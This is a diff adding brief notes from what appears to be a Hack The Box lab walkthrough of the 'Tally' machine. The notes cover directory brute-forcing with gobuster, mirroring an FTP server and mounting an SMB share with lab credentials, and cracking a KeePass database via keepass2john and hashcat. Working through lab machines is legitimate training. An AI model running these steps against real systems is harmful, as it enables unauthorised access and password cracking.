@@ -1,0 +1,27 @@
+gobuster -w seclists/Discovery/Web_Conetent/sharepoint.txt -u http://tally -o gobuster/sharepoint.txt
+
+wget --mirror 'ftp://ftp_user:password@tally.htb.local'
+
+
+find . -type f | less
+
+keepass2john ./Time/Files/time.kdbx => hashcat
+
+mount -t cifs  -o username=Finance,password=accounting //10.10.10.59/ACCT /mnt/smb
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
